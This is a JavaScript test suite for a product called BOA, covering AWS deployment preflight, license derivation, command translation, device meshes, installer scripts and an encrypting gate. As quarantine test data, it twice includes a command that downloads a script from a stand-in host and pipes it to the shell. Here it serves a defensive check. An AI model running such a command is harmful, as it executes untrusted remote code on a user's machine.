'use strict';

const assert = require('assert');
const Boa = require('../src/boa');
const AletheiaBridge = require('../src/aletheia_bridge');
const AwsPreflight = require('../scripts/aws-apprunner-preflight');


const oldAwsEnv = {
  AWS_REGION: process.env.AWS_REGION,
  APP_RUNNER_SERVICE_ARN: process.env.APP_RUNNER_SERVICE_ARN,
  AWS_ROLE_TO_ASSUME: process.env.AWS_ROLE_TO_ASSUME,
  AWS_PROFILE: process.env.AWS_PROFILE,
  AWS_ACCESS_KEY_ID: process.env.AWS_ACCESS_KEY_ID,
  AWS_SECRET_ACCESS_KEY: process.env.AWS_SECRET_ACCESS_KEY,
};
delete process.env.AWS_REGION;
delete process.env.APP_RUNNER_SERVICE_ARN;
delete process.env.AWS_ROLE_TO_ASSUME;
delete process.env.AWS_PROFILE;
delete process.env.AWS_ACCESS_KEY_ID;
delete process.env.AWS_SECRET_ACCESS_KEY;
assert.equal(AwsPreflight.collectPreflight({ skipAwsCli: true }).ok, false);
process.env.AWS_REGION = 'us-east-1';
process.env.APP_RUNNER_SERVICE_ARN = 'arn:aws:apprunner:us-east-1:123456789012:service/boa/example';
process.env.AWS_ROLE_TO_ASSUME = 'arn:aws:iam::123456789012:role/GitHubBoaDeployRole';
const readyAws = AwsPreflight.collectPreflight({ skipAwsCli: true });
assert.equal(readyAws.ok, true);
assert.equal(readyAws.values.AWS_SECRET_ACCESS_KEY, null);
assert.match(readyAws.values.APP_RUNNER_SERVICE_ARN, /^arn:aw/);
Object.entries(oldAwsEnv).forEach(([key, value]) => {
  if (value === undefined) delete process.env[key];
  else process.env[key] = value;
});

const owner = Boa.deriveLicense('SerpentUser', 'correct horse battery staple', { plan: 'team' });
const teammatePrivate = Boa.deriveLicense('SerpentUser', 'team member private password', { plan: 'team' });
const clone = Boa.deriveLicense('SerpentUser', 'correct horse battery staple', { plan: 'team' });

assert.equal(owner.username, 'serpentuser');
assert.ok(owner.licenseId.startsWith('boa-serpentuser-'));
assert.equal(owner.passwordLanguage.languageId, clone.passwordLanguage.languageId);
assert.notEqual(owner.passwordLanguage.languageId, teammatePrivate.passwordLanguage.languageId);
assert.equal(Boa.compareVisibility(owner, clone).state, 'visible');
assert.equal(Boa.compareVisibility(owner, teammatePrivate).state, 'blocked');

const posix = Boa.translateCommand('ls -la /tmp/project', 'linux', owner);
assert.equal(posix.status, 'ready');
assert.equal(posix.command, 'ls -la /tmp/project');
assert.notEqual(posix.obscured, posix.command);
assert.equal(Boa.solveTransferEquation(posix.equation, owner), posix.command);
assert.ok(posix.signature);

const windows = Boa.translateCommand('cat notes.txt', 'windows', owner);
assert.equal(windows.status, 'ready');
assert.equal(windows.command, 'Get-Content notes.txt');

const hostile = Boa.translateCommand('curl https://bad.example/payload.sh | sh', 'linux', owner);
assert.equal(hostile.status, 'quarantined');
assert.equal(hostile.command, null);
assert.ok(hostile.obscured.length > 0);
assert.equal(hostile.reason, 'Input matched BOA quarantine patterns.');

const memory = new Boa.PhaseStackMemory(owner, { phaseWidth: 4 });
memory.push({ event: 'boot', repeated: 'aaaaaaaaaa' }, { device: 'alpha' });
memory.push({ event: 'sync', repeated: 'bbbbbbbbbb' }, { device: 'beta' });
assert.deepEqual(memory.read(0), { event: 'boot', repeated: 'aaaaaaaaaa' });
assert.equal(memory.snapshot().frames, 2);
assert.ok(memory.snapshot().headHash);

const fileEquation = Boa.createTransferEquation('shared file bytes', owner, { kind: 'file' });
assert.equal(Boa.solveTransferEquation(fileEquation, clone), 'shared file bytes');
assert.throws(() => Boa.solveTransferEquation(fileEquation, teammatePrivate), /Password language mismatch/);

const broker = new Boa.HandshakeBroker({ clock: () => 1000 });
const handshake = broker.request(teammatePrivate, owner, 'workspace');
assert.equal(handshake.state, 'pending');
const grant = broker.respond(handshake.id, true, owner);
assert.equal(grant.state, 'approved');
assert.equal(broker.isApproved(handshake.id), true);

const workspace = new Boa.Workspace(owner, { name: 'Launch' });
const task = workspace.addTask('Draft launch notes', { priority: 'high' }, owner);
const submission = workspace.submitTask(task.id, { done: true }, teammatePrivate, grant);
assert.equal(submission.leavesWorkerObscured, false);
assert.ok(submission.signature);

const mesh = new Boa.DeviceMesh(owner);
mesh.registerDevice('laptop', { os: 'linux', cpuWeight: 4, memoryMb: 8192 });
mesh.registerDevice('desktop', { os: 'windows', cpuWeight: 8, memoryMb: 32768 });
assert.equal(mesh.capacity().devices, 2);
assert.equal(mesh.envelopeFor('desktop', 'dir /a C:\\Users').status, 'ready');
assert.equal(mesh.envelopeFor('laptop', 'pwd').command, 'pwd');

const solo = Boa.deriveLicense('SoloUser', 'single device', { plan: 'solo' });
const soloMesh = new Boa.DeviceMesh(solo);
soloMesh.registerDevice('phone', { os: 'boa' });
assert.throws(() => soloMesh.registerDevice('tablet', { os: 'boa' }), /allows 1 device/);

const node = Boa.createUnifiedNode('UnifiedUser', 'unified password', { plan: 'team', platform: 'linux' });
assert.equal(node.dialect, 'posix');
assert.equal(node.license.heartbeatUrl, Boa.DEFAULT_HEARTBEAT_URL);

const aletheiaStatus = AletheiaBridge.integrationSummary();
assert.equal(aletheiaStatus.mode, 'namespaced-coexistence');
assert.ok(aletheiaStatus.repositories.some((repo) => repo.name === 'AeonUnifiedAletheia_FullFeatured'));
assert.ok(aletheiaStatus.repositories.some((repo) => repo.name === 'MyAletheia222069'));
const omegaSolve = AletheiaBridge.omegaClosureReverseSolve('merged BOA/Aletheia product', { alphaSpatial: 1.1, alphaTemporal: 0.9 });
assert.equal(omegaSolve.operator, 'Omega Closure Reverse Operator');
assert.equal(omegaSolve.alpha.split, 'α_Ω = α_m/s ⊕ α_s/m');
assert.equal(omegaSolve.cancellation.state, 'standing-wave-matter');
assert.ok(omegaSolve.reversePath.some((step) => step.step === 'μ'));
const cyberPlan = AletheiaBridge.buildCyberSecurityAppPlan({ target: 'most advanced honest BOA security app' });
assert.equal(cyberPlan.mode, 'aletheia-boa-cybersecurity-builder-v1');
assert.ok(cyberPlan.capabilityLayers.some((layer) => layer.name === 'Signal membrane' && layer.implementedNow));
assert.ok(cyberPlan.capabilityLayers.some((layer) => layer.name === 'Privileged traffic adapters' && !layer.implementedNow));
assert.ok(cyberPlan.acceptanceTests.some((test) => test.includes('strict mode rejects raw signals')));
const unifiedWorkspace = AletheiaBridge.unifiedWorkspaceStatus();
assert.equal(unifiedWorkspace.mode, 'local-monorepo-boundary');
assert.equal(unifiedWorkspace.unified, true);
assert.ok(unifiedWorkspace.modules.some((moduleInfo) => moduleInfo.id === 'aeon-unified-aletheia' && moduleInfo.exists && moduleInfo.fileCount > 10));
assert.ok(unifiedWorkspace.modules.some((moduleInfo) => moduleInfo.id === 'myaletheia222069' && moduleInfo.exists));
const fullUnification = AletheiaBridge.fullUnificationPlan({ target: 'single BOA Aletheia product' });
assert.equal(fullUnification.mode, 'boa-aletheia-full-unification-v1');
assert.equal(fullUnification.workspace.unified, true);



const pricingQuote = Boa.estimatePerDevicePricing(5);
assert.equal(pricingQuote.freeSecurity, true);
assert.equal(pricingQuote.monthlyUsd, 10);
assert.ok(pricingQuote.efficiencyMultiplier > 1);
const phaseDemo = Boa.simulatePhaseLattice({ size: 64, steps: 30, devices: 5 });
assert.equal(phaseDemo.mode, 'boa-phase-lattice-simulation-v1');
assert.equal(phaseDemo.recovery.wrongKeyLooksLikeGarbage, true);
assert.ok(phaseDemo.recovery.correctKeyMse < 1e-18);
assert.ok(phaseDemo.compression.compressionFactor >= 1);
assert.equal(phaseDemo.pricing.monthlyUsd, pricingQuote.monthlyUsd);
const phaseStack = new Boa.PhaseCoordinateStack(owner, { gridSize: 8, maxDepth: 6 });
const storedStack = phaseStack.store('launch-file', { body: 'phase stack payload' });
assert.equal(phaseStack.bringForward(storedStack, owner).body, 'phase stack payload');
assert.match(storedStack.equationPath[0], /^L0:/);
assert.ok(phaseStack.snapshot(5).unifiedEfficiency.efficiencyMultiplier > 1);
const stackDemo = Boa.runPhaseStackDemo({ devices: 5, payload: { body: 'demo' } });
assert.equal(stackDemo.matches, true);
assert.equal(stackDemo.mode, 'boa-phase-stack-demo-v1');

const maintainer = Boa.createMaintainerPolicy({ publicKeyFingerprint: Boa.stableHash('public-key').slice(0, 16) });
assert.equal(maintainer.canAcceptUpdate({ publicKey: 'public-key' }), true);
assert.equal(Boa.createMaintainerPolicy().canAcceptUpdate({ publicKey: 'public-key' }), false);

console.log('BOA protocol tests passed');

const fs = require('fs');
const os = require('os');
const path = require('path');
const { BoaSite, verifyPassword } = require('../src/boa_site');

const statePath = path.join(os.tmpdir(), `boa-site-${Date.now()}-${Math.random()}.json`);
const site = new BoaSite({ statePath, baseUrl: 'http://127.0.0.1:8787' });
const signup = site.createAccount({ username: 'DashboardUser', password: 'strong dashboard password', plan: 'solo' });
assert.equal(signup.account.username, 'dashboarduser');
assert.ok(signup.downloadUrl.startsWith('/download/installer?platform=auto&session='));
assert.equal(verifyPassword('strong dashboard password', site.state.accounts[signup.account.id].passwordRecord), true);

assert.equal(Object.keys(site.state.sessions).includes(signup.sessionToken), false);
assert.equal(Object.values(site.state.sessions).length, 1);

const installer = site.installerScript(signup.sessionToken, 'linux');
assert.equal(installer.filename, 'install-boa-daemon.sh');
assert.match(installer.body, /BOA gate is installed and running/);
const encodedParts = [...installer.body.matchAll(/printf '%s' '([^']+)'/g)].map((match) => match[1]).filter((value, index, all) => all.indexOf(value) === index);
assert.equal(encodedParts.length, 3);
const daemonSource = Buffer.from(encodedParts[0], 'base64').toString('utf8');
const gateSource = Buffer.from(encodedParts[1], 'base64').toString('utf8');
const daemonConfig = JSON.parse(Buffer.from(encodedParts[2], 'base64').toString('utf8'));
assert.match(daemonSource, /BOA daemon developer mode/);
assert.match(gateSource, /boa-envelope-v1/);
assert.equal(daemonConfig.policy, 'protected');
assert.doesNotMatch(daemonSource, /strong dashboard password/);


const sitePricing = site.pricingQuote({ devices: 6 });
assert.equal(sitePricing.freeSecurity, true);
assert.equal(sitePricing.monthlyUsd, 12);
const sitePhase = site.phaseLatticeDemo({ size: 32, steps: 12, devices: 6 });
assert.equal(sitePhase.mode, 'boa-phase-lattice-simulation-v1');
assert.ok(sitePhase.recovery.wrongKeyMse > sitePhase.recovery.correctKeyMse);
const siteStack = site.phaseStackDemo({ devices: 6, payload: { body: 'site stack' } });
assert.equal(siteStack.matches, true);
assert.equal(siteStack.recovered.body, 'site stack');

const dashboard = site.dashboardData(signup.sessionToken);
assert.equal(dashboard.devices.length, 1);
assert.equal(dashboard.account.automation.resourceSharing, true);
assert.throws(() => site.downloadDaemon(signup.sessionToken), /allows 1 device/);
const updatedAutomation = site.updateAutomation(signup.sessionToken, { resourceSharing: false, casting: false });
assert.equal(updatedAutomation.automation.resourceSharing, false);

const tokenMatch = [null, daemonConfig.deviceToken];
assert.ok(tokenMatch[1]);
const heartbeat = site.heartbeat({
  deviceToken: tokenMatch[1],
  platform: 'linux',
  hostname: 'node-a',
  uptimeSeconds: 10,
  memory: { total: 100, free: 50 },
  cpus: 4,
});
assert.equal(heartbeat.status, 'online');
assert.equal(heartbeat.dialect, 'posix');
assert.equal(heartbeat.automation.resourceSharing, false);
assert.equal(site.dashboardData(signup.sessionToken).devices[0].signalStatus, 'BOA signal active');
assert.equal(site.state.devices[dashboard.devices[0].id].resources.sharing, 'disabled-by-user');
assert.throws(() => site.castFrame({ deviceToken: tokenMatch[1], title: 'terminal', frame: 'blocked' }), /Casting is disabled/);
site.updateAutomation(signup.sessionToken, { casting: true });

const cast = site.castFrame({ deviceToken: tokenMatch[1], title: 'terminal', frame: 'build passed' });
assert.equal(cast.frames, 1);

const pairing = site.startPairing(signup.sessionToken, { deviceName: 'Laptop' });
assert.match(pairing.code, /^\d{6}$/);
assert.throws(() => site.completePairing({ pairingId: pairing.pairingId, code: '000000' }), /Invalid pairing code/);

const wrappedSignal = site.sendSignal(signup.sessionToken, { message: 'hello boa' });
assert.equal(wrappedSignal.status, 'Signal wrapped');
assert.equal(wrappedSignal.envelope.format, 'boa-envelope-v1');
assert.equal(wrappedSignal.envelope.bodyEncoding, 'aes-256-gcm-base64url');
assert.notEqual(Buffer.from(wrappedSignal.envelope.body, 'base64url').toString('utf8'), 'hello boa');
assert.match(site.architectureSummary().core, /BOA Core/);
assert.ok(site.backendComponents().some((component) => component.name === 'BOA Network envelopes'));
assert.ok(site.backendComponents().some((component) => component.name === 'Unified Aletheia workspace'));
assert.equal(site.aletheiaStatus().mode, 'namespaced-coexistence');
assert.equal(site.aletheiaReverseSolve({ target: 'dashboard bridge' }).operator, 'Omega Closure Reverse Operator');
assert.equal(site.aletheiaCyberApp({ target: 'dashboard cyber app' }).mode, 'aletheia-boa-cybersecurity-builder-v1');
assert.equal(site.aletheiaUnifiedStatus().unified, true);
assert.equal(site.aletheiaFullUnification({ target: 'dashboard unification' }).mode, 'boa-aletheia-full-unification-v1');
assert.equal(site.deploymentDecision().target, 'AWS App Runner primary; Elastic Beanstalk or Docker fallback');
assert.equal(site.publicConfig().deploymentDecision.stack, 'full-stack-node-server-with-static-ui');
assert.match(site.aletheiaHtml(), /Unified local workspace/);
site.createStripeCheckout(signup.sessionToken, 'team').then((checkout) => {
  assert.equal(checkout.mode, 'demo');
  assert.equal(checkout.account.plan, 'team');
});
const receivedSignal = site.receiveSignal(signup.sessionToken, { envelope: wrappedSignal.envelope });
assert.equal(receivedSignal.status, 'Signal received');
assert.equal(receivedSignal.payload, 'hello boa');

const receipt = site.purchasePlan(signup.sessionToken, 'enterprise');
assert.equal(receipt.account.plan, 'enterprise');

const siteTask = site.addTask(signup.sessionToken, 'Ship daemon');
const done = site.completeTask(signup.sessionToken, siteTask.id, { shipped: true });
assert.equal(done.signedBy, signup.account.usernameKey);

fs.rmSync(statePath, { force: true });


const teamStatePath = path.join(os.tmpdir(), `boa-site-team-${Date.now()}-${Math.random()}.json`);
const teamSite = new BoaSite({ statePath: teamStatePath, baseUrl: 'http://127.0.0.1:8787' });
const teamSignup = teamSite.createAccount({ username: 'TeamDaemonUser', password: 'team daemon password', plan: 'team' });
const issued = teamSite.issueDaemonForSession(teamSignup.sessionToken, { label: 'linux-node', platform: 'linux' });
assert.equal(issued.account.username, 'teamdaemonuser');
assert.ok(issued.daemon.deviceToken);
assert.equal(teamSite.state.devices[issued.daemon.deviceId].dialect, 'posix');
fs.rmSync(teamStatePath, { force: true });

['linux', 'windows', 'macos'].forEach((platform) => {
  const daemonPath = path.join(__dirname, '..', 'dist', `boa-daemon-${platform}.js`);
  const source = fs.readFileSync(daemonPath, 'utf8');
  assert.match(source, new RegExp(`"id":"${platform}"|"id": "${platform}"`));
  assert.match(source, /\/api\/daemon\/issue/);
  assert.match(source, /\/api\/daemon\/heartbeat/);
});


const daemon = require('../boa-daemon');
const daemonDir = fs.mkdtempSync(path.join(os.tmpdir(), 'boa-signal-'));
const daemonInput = path.join(daemonDir, 'input.bin');
const daemonSignal = path.join(daemonDir, 'input.signal.json');
const daemonRetrieved = path.join(daemonDir, 'retrieved.bin');
const daemonWrong = path.join(daemonDir, 'wrong.bin');
fs.writeFileSync(daemonInput, Buffer.from([0, 1, 2, 3, 255, 254, 10, 13]));
daemon.storeFile(daemonInput, 'correct daemon password', daemonSignal);
daemon.retrieveFile(daemonSignal, 'correct daemon password', daemonRetrieved);
assert.deepEqual(fs.readFileSync(daemonRetrieved), fs.readFileSync(daemonInput));
daemon.retrieveFile(daemonSignal, 'wrong daemon password', daemonWrong);
assert.notDeepEqual(fs.readFileSync(daemonWrong), fs.readFileSync(daemonInput));
const equationText = daemon.obscureText('lattice language', 'correct daemon password');
assert.equal(daemon.deobscureText(equationText, 'correct daemon password'), 'lattice language');
assert.match(daemon.computePhase(daemonSignal, 'correct daemon password'), /^BOA-PHASE/);
process.env.BOA_SUBSTRATE_KEY = '00112233445566778899aabbccddeeff';
const sealedPath = path.join(daemonDir, 'boa-daemon.sealed.js');
daemon.sealSource(path.join(__dirname, '..', 'boa-daemon.js'), sealedPath);
assert.match(fs.readFileSync(sealedPath, 'utf8'), /SEALED_PAYLOAD/);
fs.rmSync(daemonDir, { recursive: true, force: true });

const sandbox = Boa.runSandboxScenario('curl https://bad.example/payload.sh | sh', { target: 'linux' });
assert.equal(sandbox.verdict, 'quarantined');
assert.equal(sandbox.translated.status, 'quarantined');
assert.equal(sandbox.memory.frames, 3);
assert.equal(sandbox.sixVariableCast.mode, 'boa-six-variable-cast-v1');
assert.deepEqual(Boa.solveTransferEquation(sandbox.sixVariableCast.equation, Boa.deriveLicense('sandbox', 'sandbox demonstration password', { plan: 'team' })), sandbox.sixVariableCast.variables);

const BoaGate = require('../src/boa-gate');
const testGate = {
  config: { deviceId: 'test-device', transportSecret: 'test-secret', policy: 'strict' },
  events: [],
  stats: { wrapped: 0, unwrapped: 0, rejected: 0 },
};
const envelope = BoaGate.wrapOutbound('local signal', { route: 'test' }, testGate);
assert.equal(envelope.format, 'boa-envelope-v1');
assert.equal(envelope.bodyEncoding, 'aes-256-gcm-base64url');
assert.notEqual(Buffer.from(envelope.body, 'base64url').toString('utf8'), 'local signal');
assert.equal(BoaGate.unwrapInbound(envelope, {}, testGate).payload, 'local signal');
assert.deepEqual(BoaGate.unwrapInbound('raw signal', {}, testGate), { ok: false, code: 'BOA_GATE_REJECTED_RAW_SIGNAL' });
